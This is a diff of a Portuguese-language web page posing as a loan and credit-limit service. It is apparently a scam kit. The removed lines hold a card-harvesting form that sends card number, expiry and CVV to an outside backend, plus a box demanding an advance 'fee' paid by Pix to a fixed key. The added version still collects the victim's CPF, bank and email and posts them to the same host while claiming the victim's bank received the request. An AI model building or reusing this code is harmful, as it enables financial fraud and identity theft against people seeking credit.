@@ -33,27 +33,6 @@
       font-size: 20px;
     }
 
-    .options {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-    }
-
-    .options button {
-      padding: 15px;
-      font-size: 16px;
-      font-weight: bold;
-      background-color: #b30000;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    form {
-      display: none;
-    }
-
     label {
       display: block;
       margin-top: 15px;
@@ -61,33 +40,13 @@
       color: #555;
     }
 
-    input, select {
+    input {
       width: 100%;
       padding: 12px;
       margin-top: 6px;
       border: 1px solid #ccc;
       border-radius: 6px;
       font-size: 15px;
-    }
-
-    .form-row {
-      display: flex;
-      gap: 10px;
-    }
-
-    .form-row input {
-      flex: 1;
-    }
-
-    .card-logos {
-      margin-top: 10px;
-      display: flex;
-      gap: 10px;
-    }
-
-    .card-logos img {
-      height: 26px;
-      opacity: 0.8;
     }
 
     button[type="submit"] {
@@ -101,13 +60,6 @@
       font-size: 16px;
       font-weight: 600;
       cursor: pointer;
-    }
-
-    .info-text {
-      margin-top: 15px;
-      font-size: 13px;
-      color: #555;
-      text-align: center;
     }
 
     #resultado {
@@ -125,42 +77,9 @@
 </head>
 <body>
   <div class="container">
-    <h2>Escolha uma opção</h2>
-    <div class="options" id="menu-opcoes">
-      <button onclick="mostrarFormulario('cartao')">Aumento/liberação de limite</button>
-      <button onclick="mostrarFormulario('emprestimo')">Empréstimo</button>
-    </div>
-
-    <!-- Formulário Cartão -->
-    <form id="form-cartao">
-      <h2>Confirme os dados do cartão</h2>
-      <label for="card-number">Número do Cartão</label>
-      <input type="text" id="card-number" maxlength="19" placeholder="0000 0000 0000 0000" required />
-
-      <div class="card-logos">
-        <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
-        <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard">
-        <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
-      </div>
-
-      <div class="form-row">
-        <div>
-          <label for="validade">Validade</label>
-          <input type="text" id="validade" maxlength="5" placeholder="MM/AA" required />
-        </div>
-        <div>
-          <label for="cvv">CVV</label>
-          <input type="text" id="cvv" maxlength="4" placeholder="123" required />
-        </div>
-      </div>
-
-      <button type="submit">Confirmar</button>
-      <p class="info-text">O novo limite será disponibilizado em até 2 a 5 dias úteis após análise.</p>
-    </form>
-
-    <!-- Formulário Empréstimo -->
     <form id="form-emprestimo">
-      <h2>Solicitar Empréstimo</h2>
+      <h2>Solicitar Empréstimo/Limite</h2>
+
       <label for="valor">Quanto você deseja?</label>
       <input type="text" id="valor" placeholder="Ex: 5000" required />
 
@@ -170,6 +89,9 @@
       <label for="cpf">Qual seu CPF?</label>
       <input type="text" id="cpf" placeholder="000.000.000-00" required />
 
+      <label for="email">Qual seu email?</label>
+      <input type="email" id="email" placeholder="seuemail@exemplo.com" required />
+
       <button type="submit">Solicitar</button>
     </form>
 
@@ -178,49 +100,8 @@
   </div>
 
   <script>
-    const formCartao = document.getElementById('form-cartao');
     const formEmprestimo = document.getElementById('form-emprestimo');
     const resultadoDiv = document.getElementById('resultado');
-
-    function mostrarFormulario(tipo) {
-      document.getElementById('menu-opcoes').style.display = 'none';
-      if (tipo === 'cartao') {
-        formCartao.style.display = 'block';
-      } else {
-        formEmprestimo.style.display = 'block';
-      }
-    }
-
-    // Máscaras
-    document.getElementById('card-number').addEventListener('input', function (e) {
-      let value = e.target.value.replace(/\D/g, '').slice(0, 16);
-      e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
-    });
-
-    document.getElementById('validade').addEventListener('input', function (e) {
-      let value = e.target.value.replace(/\D/g, '').slice(0, 4);
-      if (value.length >= 3) value = value.slice(0, 2) + '/' + value.slice(2);
-      e.target.value = value;
-    });
-
-    document.getElementById('cvv').addEventListener('input', function (e) {
-      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
-    });
-
-    formCartao.addEventListener('submit', function (e) {
-      e.preventDefault();
-      fetch('https://credplus-backend.onrender.com/enviar', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          numeroCartao: document.getElementById('card-number').value,
-          validade: document.getElementById('validade').value,
-          cvv: document.getElementById('cvv').value
-        })
-      })
-      .then(res => res.ok ? window.location.href = 'sucesso.html' : alert('Erro ao enviar.'))
-      .catch(() => alert('Erro ao enviar.'));
-    });
 
     formEmprestimo.addEventListener('submit', function (e) {
       e.preventDefault();
@@ -229,9 +110,15 @@
       const valor = parseFloat(valorInput.replace(',', '.'));
       const banco = document.getElementById('banco').value;
       const cpf = document.getElementById('cpf').value;
+      const email = document.getElementById('email').value;
 
       if (isNaN(valor) || valor <= 0) {
         alert('Por favor, insira um valor válido.');
+        return;
+      }
+
+      if (!email || !email.includes('@')) {
+        alert('Por favor, insira um email válido.');
         return;
       }
 
@@ -239,38 +126,18 @@
       const valorFormatado = valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
       const taxaFormatada = taxa.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
 
+      // Caixa de mensagem de confirmação
       resultadoDiv.innerHTML = `
-        <p><strong>Valor escolhido:</strong> ${valorFormatado}</p>
-        <p><strong>Valor da taxa:</strong> ${taxaFormatada}</p>
         <div style="
           background-color: #f9f9f9;
           border: 1px solid #ccc;
           border-radius: 10px;
-          padding: 20px;
-          margin-top: 20px;
-          text-align: center;
+          padding: 30px 20px;
+          margin-top: 25px;
+          box-shadow: 0 0 12px rgba(0,0,0,0.1);
         ">
-          <h3 style="margin-bottom: 10px; color: #b30000;">Negociação quase concluída</h3>
-          <p style="font-weight: 500;">PAGUE A TAXA NO PIX INFORMADO ABAIXO PARA LIBERAR O VALOR SELECIONADO</p>
-          <p style="margin: 15px 0; font-size: 16px;">
-            <strong>CHAVE PIX:</strong><br>
-            <input type="text" value="d45e4ea4-d3d0-42a6-8050-e93bec690d65" id="pix-chave" readonly
-              style="margin-top: 8px; padding: 8px; font-size: 14px; width: 100%; border: 1px solid #aaa; border-radius: 6px;" />
-            <button onclick="copiarPix()" style="
-              margin-top: 10px;
-              padding: 8px 12px;
-              font-size: 14px;
-              background-color: #b30000;
-              color: white;
-              border: none;
-              border-radius: 6px;
-              cursor: pointer;
-            ">Copiar Chave Pix</button>
-          </p>
-          <p style="font-size: 13px; color: #555;">
-            Após pagar a taxa, o valor do empréstimo será liberado em sua conta em até 1 a 3 horas
-            <br>(Feriados e fins de semana podem levar mais tempo)
-          </p>
+          <h2 style="color: #b30000; font-size: 18px;">Sua solicitação foi enviada à equipe do <strong>${banco}</strong>.</h2>
+          <p style="margin-top: 10px; color: #333;">As próximas informações chegarão via Email.</p>
         </div>
       `;
 
@@ -281,18 +148,11 @@
           valor: valorFormatado,
           banco: banco,
           cpf: cpf,
+          email: email,
           taxa: taxaFormatada
         })
       }).catch(() => alert('Erro ao enviar.'));
     });
-
-    function copiarPix() {
-      const input = document.getElementById("pix-chave");
-      input.select();
-      input.setSelectionRange(0, 99999);
-      document.execCommand("copy");
-      alert("Chave Pix copiada!");
-    }
   </script>
 </body>
 </html>
